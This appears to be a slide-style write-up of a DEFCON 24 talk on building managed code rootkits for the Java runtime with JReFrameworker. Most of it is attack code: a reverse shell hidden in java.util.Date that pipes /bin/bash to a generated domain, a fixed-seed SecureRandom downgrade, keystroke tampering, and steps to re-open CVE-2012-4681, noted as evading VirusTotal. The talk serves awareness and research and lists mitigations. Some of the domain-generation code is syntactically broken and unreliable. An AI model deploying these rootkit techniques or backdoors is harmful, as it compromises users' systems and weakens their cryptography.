# Developing Managed Code Rootkits for the Java Runtime Environment

## Presentation Overview
- **Event:** DEFCON 24
- **Date:** August 6th, 2016
- **Presenter:** [Your Name]

## Introduction
- **Title:** Developing Managed Code Rootkits for the Java Runtime Environment
- **Background**
- **JReFrameworker**
- **Modules**
- **Mitigations**
- **Q&A**

## Pixelated Images
- **Pixel Size Variations:**
  - 5x
  - 10x
  - 25x
  - 50x

### Example Code
```java
@MergeType
public class PixelatedBufferedImage extends BufferedImage {
    @DefineField
    boolean pixelated = false;

    @MergeMethod
    public Graphics getGraphics() {
        if (!pixelated) {
            setData(pixelate(getData()));
        }
        return super.getGraphics();
    }
}
```

## Decreasing Productivity
- **SpellWrecker Class:**
  - Inverse of a spellchecker
  - Injects typos based on typing speed
  - Reduces typos as typing speed decreases

### Example Code
```java
@MergeType
public class SpellWreckedKeyEvent extends KeyEvent {
    @MergeMethod
    @Override
    public char getKeyChar() {
        char original = super.getKeyChar();
        return SpellWrecker.spellwreck(original);
    }
}
```

## CVE-2012-4681
- **Description:**
  - Applet can bypass security restrictions to execute arbitrary code
  - Combination of two vulnerabilities
  - Excellent reliability, multi-platform
  - "Gondvv" exploit found in the wild (August 2012)
  - PoC Exploit: [http://pastie.org/4594319](http://pastie.org/4594319)
  - Metasploit Module: `exploit/multi/browser/java_jre17_exec`
  - Detailed analysis by Immunity Products

### Exploit Armoring Experiment
- **Source:** [github.com/benjholla/CVE-2012-4681-Armoring](https://github.com/benjholla/CVE-2012-4681-Armoring)
- **VirusTotal Submission:**
  - 2 years after found in the wild
  - 4 years after found in the wild

### The Reverse Bug Patch
- **Unfixing CVE-2012-4681 in Java 8:**
  - Remove calls to `ReflectUtil.checkPackageAccess` in `com.sun.beans.finder.ClassFinder`
  - Remove calls to `ReflectUtil.isPackageAccessible` in `com.sun.beans.finder.MethodFinder`
  - Restore `getField` method in `sun.awt.SunToolkit`
  - Unobfuscated vulnerability gets 0/56 on VirusTotal

## SCADA HMI Application Modifications
- **Objective:**
  - Enhance security for "alarms" list without access to source code
  - Backend server enhanced with an application firewall
  - Firewall supports new security policy mechanisms (e.g., two-factor authentication)
  - HMI client UI enhanced with prompts for firewall challenge responses

## Mitigations
- **Bytecode Modification Indicators:**
  - File hash
  - File size (original: ~50mb, modified: ~25mb)
  - "jref_" method rename prefix
  - Class/Method/Field counts
  - Code metrics (e.g., cyclomatic complexity)

## Being Aware
- **JReFrameworker:**
  - An awareness project

## Q&A
- **Questions?**
- **Thank You!**
  - Setup + Tutorials: [jreframeworker.com](http://jreframeworker.com)
  - Source Code: [github.com/JReFrameworker](https://github.com/JReFrameworker)
  - References: [github.com/JReFrameworker/JReFrameworker/blob/master/REFERENCES.md](https://github.com/JReFrameworker/JReFrameworker/blob/master/REFERENCES.md)
  - Additional Resources:
    - Managed Code Rootkits: [appsec-labs.com/managed_code_rootkits](http://appsec-labs.com/managed_code_rootkits)
    - ASM Transformations Whitepaper: [asm.ow2.org/current/asm-transformations.pdf](http://asm.ow2.org/current/asm-transformations.pdf)

## The JVM Isn't Just for Java
- **JVM-Specific Languages:**
  - Java, Scala, Clojure, Groovy, Ceylon, Fortress, Gosu, Kotlin, etc.
- **Ported Languages:**
  - JRuby, Jython, Smalltalk, Ada, Scheme, REXX, Prolog, Pascal, Common LISP, etc.

## Pokémon! Gotta Hack 'Em All!
- **Application Callbacks:**
  - Add tactile feedback for special premium bracelet notifications
  - Toolchain for modifying Android apps: `.apk -> APKTool -> Dex2Jar -> JReFrameworker -> DX -> APKTool -> .apk`

### Example Code
```java
@MergeType
public class NotifyLegendaryPokemon extends com.nianticproject.holoholo.sfida.unity.SfidaUnityPlugin {
    @MergeMethod
    public boolean notifySpawnedLegendaryPokemon(String param) {
        vibrate();
        return super.notifySpawnedLegendaryPokemon(param);
    }
}
```

## DEFCON Inspirations
- **Honored to be here**
- **Early memories:**
  - Reading Winn Schwartau’s "Information Warfare"
  - One of the first introductions to security topics
  - Inspired by a previous DEFCON talk

## Reverse Shell + DGA
- **Malicious Client:**
  - Probes for payload
  - Creates a reverse shell to the domain of the day

### Example Code
```java
public static void main(String[] args) throws Exception {
    Date d = new Date();
    Method method = d.getClass().getDeclaredMethod("reverseShell");
    method.setAccessible(true);
    method.invoke(d);
}

public class java.util.Date {
    private void reverseShell() {
        String domain = "www.";
        int year = getYear();
        int month = getMonth();
        int day = getDay();
        for (int i = 0; i < 10; i++) {
            // Domain generation algorithm
            year = ((year & 0xFFFFFFFE) >> 11) ^ ((year & 0xFFFFFFF0) > 25) ^ 16 * (month & 0xFFFFFFF8);
            day = ((day ^ (day > 19)) ^ ((day & 0xFFFFFFFE) << 12);
            domain += (char) ((Math.abs((year ^ month ^ day)) % 25) + 97);
        }
        domain += ".com";
        InetAddress address = InetAddress.getByName(domain);
        String ipAddress = address.getHostAddress();
        final Process process = Runtime.getRuntime().exec("/bin/bash");
        Socket socket = new Socket(ipAddress, 6666);
        forwardStream(socket.getInputStream(), process.getOutputStream());
        forwardStream(process.getInputStream(), socket.getOutputStream());
        forwardStream(process.getErrorStream(), socket.getOutputStream());
        process.waitFor();
    }
}
```

## Downgrading Security
- **InsecureRandom Class:**
  - Replaces `SecureRandom` with a fixed seed

### Example Code
```java
@MergeType
public class InsecureRandom extends SecureRandom {
    @DefineField
    private Random random;

    @MergeMethod
    public int nextInt() {
        if (random == null) {
            random = new Random(0 /* fixed seed */);
        }
        return random.nextInt();
    }
}
```

---

**Thank you for your attention!**  
**Questions?**